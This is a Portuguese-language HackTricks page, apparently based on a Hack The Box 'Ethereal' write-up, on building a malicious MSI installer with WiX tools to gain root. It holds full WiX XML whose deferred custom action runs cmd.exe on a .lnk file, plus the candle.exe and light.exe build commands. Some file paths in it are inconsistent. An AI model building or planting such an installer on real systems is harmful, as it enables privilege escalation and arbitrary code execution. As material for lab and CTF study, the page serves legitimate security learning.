{{#include ../../banners/hacktricks-training.md}}

# Criando MSI Malicioso e Obtendo Root

A criação do instalador MSI será feita usando wixtools, especificamente [wixtools](http://wixtoolset.org) será utilizado. Vale mencionar que construtores MSI alternativos foram tentados, mas não tiveram sucesso neste caso específico.

Para uma compreensão abrangente de exemplos de uso do wix MSI, é aconselhável consultar [esta página](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Aqui, você pode encontrar vários exemplos que demonstram o uso do wix MSI.

O objetivo é gerar um MSI que executará o arquivo lnk. Para alcançar isso, o seguinte código XML pode ser empregado ([xml from here](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
É importante notar que o elemento Package contém atributos como InstallerVersion e Compressed, especificando a versão do instalador e indicando se o pacote está comprimido ou não, respectivamente.

O processo de criação envolve a utilização do candle.exe, uma ferramenta do wixtools, para gerar um wixobject a partir do msi.xml. O seguinte comando deve ser executado:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Além disso, vale a pena mencionar que uma imagem é fornecida na postagem, que retrata o comando e sua saída. Você pode se referir a ela para orientação visual.

Além disso, light.exe, outra ferramenta do wixtools, será utilizada para criar o arquivo MSI a partir do wixobject. O comando a ser executado é o seguinte:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Semelhante ao comando anterior, uma imagem está incluída na postagem ilustrando o comando e sua saída.

Por favor, note que, embora este resumo tenha como objetivo fornecer informações valiosas, é recomendável consultar a postagem original para obter detalhes mais abrangentes e instruções precisas.

## Referências

- [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)

{{#include ../../banners/hacktricks-training.md}}
